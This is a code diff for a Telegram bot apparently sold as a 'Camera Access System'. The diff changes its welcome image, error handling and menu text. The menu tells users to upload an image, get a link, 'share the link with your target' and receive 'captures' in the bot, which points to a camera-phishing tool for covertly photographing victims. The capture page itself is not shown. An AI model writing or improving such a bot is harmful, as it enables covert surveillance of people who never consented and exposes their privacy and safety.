@@ -14,7 +14,7 @@ const BASE_URL = process.env.BASE_URL || 'https://camera-5nbr.onrender.com';
 const PORT = process.env.PORT || 3000;
 
 const CHANNEL_USERNAME = '@camera_access';
-const WELCOME_IMAGE_URL = 'https://via.placeholder.com/400x400.png?text=Welcome+Image'; // Replace this URL with your actual image URL later
+const WELCOME_IMAGE_URL = 'https://cyrjsbfsfhcwocdqtkuv.supabase.co/storage/v1/object/public/Maruf/ChatGPT%20Image%20Jun%2012,%202026,%2012_43_05%20AM.png';
 
 // Initialize clients
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
@@ -33,7 +33,7 @@ async function checkMembership(userId) {
         const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
         return ['creator', 'administrator', 'member'].includes(member.status);
     } catch (err) {
-        console.error('Membership check error:', err);
+        console.error('Membership check error:', err.message);
         return false;
     }
 }
@@ -47,7 +47,23 @@ function showStartMenu(chatId) {
         },
         parse_mode: 'HTML'
     };
-    bot.sendMessage(chatId, '<b>🎉 Verification Successful!</b>\n\nYou can now use the bot. Click <b>Start Task</b> below to begin.', opts);
+    
+    const menuText = `<b>🌟 Welcome to the Ultimate Camera Access System 🌟</b>
+
+<b>Developed by:</b> <i>Maruf</i>
+
+✅ <b>Verification Successful!</b>
+You have been successfully verified as a premium member of our community. 
+
+<b>🔹 How it works:</b>
+1️⃣ Click the <b>Start Task</b> button below.
+2️⃣ Upload the image you want to share.
+3️⃣ Get a unique secure link.
+4️⃣ Share the link with your target.
+
+<i>We ensure 100% security and fast delivery of your captures directly to this bot. Enjoy our professional service!</i>`;
+
+    bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: menuText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
 }
 
 // ================= Telegram Bot Logic =================
@@ -56,26 +72,34 @@ bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
-    // Check membership
-    const isMember = await checkMembership(userId);
-    
-    if (!isMember) {
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '📢 Join Channel', url: 'https://t.me/camera_access' }],
-                    [{ text: '✅ Check Joined', callback_data: 'check_joined' }]
-                ]
-            },
-            parse_mode: 'HTML'
-        };
-        const welcomeText = `<b>Welcome to Camera Access Bot!</b> 📸\n\nTo use this bot, you must join our official channel first. Please join the channel and click <b>Check Joined</b>.`;
+    try {
+        // First, let user know we are checking
+        bot.sendChatAction(chatId, 'typing');
         
-        bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: welcomeText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
-        return;
+        // Check membership
+        const isMember = await checkMembership(userId);
+        
+        if (!isMember) {
+            const opts = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '📢 Join Our Official Channel', url: 'https://t.me/camera_access' }],
+                        [{ text: '✅ I Have Joined (Verify)', callback_data: 'check_joined' }]
+                    ]
+                },
+                parse_mode: 'HTML'
+            };
+            const welcomeText = `<b>🛑 Access Denied!</b>\n\nHello there! To use <b>Maruf's Premium Bot</b>, you must be a member of our official channel.\n\n👇 <b>Please follow these steps:</b>\n1. Click "Join Our Official Channel"\n2. Join the channel.\n3. Come back and click "I Have Joined"`;
+            
+            bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: welcomeText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
+            return;
+        }
+        
+        showStartMenu(chatId);
+    } catch (error) {
+        console.error("Start command error:", error);
+        bot.sendMessage(chatId, "Sorry, something went wrong. Please try again.");
     }
-    
-    showStartMenu(chatId);
 });
 
 bot.on('callback_query', async (callbackQuery) => {
@@ -83,19 +107,23 @@ bot.on('callback_query', async (callbackQuery) => {
     const chatId = msg.chat.id;
     const userId = callbackQuery.from.id;
     
-    if (callbackQuery.data === 'check_joined') {
-        const isMember = await checkMembership(userId);
-        if (isMember) {
-            bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
-            showStartMenu(chatId);
-        } else {
-            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet!', show_alert: true });
+    try {
+        if (callbackQuery.data === 'check_joined') {
+            const isMember = await checkMembership(userId);
+            if (isMember) {
+                bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
+                showStartMenu(chatId);
+            } else {
+                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet! Please join first.', show_alert: true });
+            }
         }
-    }
-    else if (callbackQuery.data === 'start_task') {
-        awaitingImage[chatId] = true;
-        bot.sendMessage(chatId, '<i>Please send me an image that you want to show to the user.</i>', { parse_mode: 'HTML' });
-        bot.answerCallbackQuery(callbackQuery.id);
+        else if (callbackQuery.data === 'start_task') {
+            awaitingImage[chatId] = true;
+            bot.sendMessage(chatId, '<b>📸 Please upload the image you want to use.</b>\n<i>Just send any photo directly to me now.</i>', { parse_mode: 'HTML' });
+            bot.answerCallbackQuery(callbackQuery.id);
+        }
+    } catch (error) {
+        console.error("Callback query error:", error);
     }
 });
 
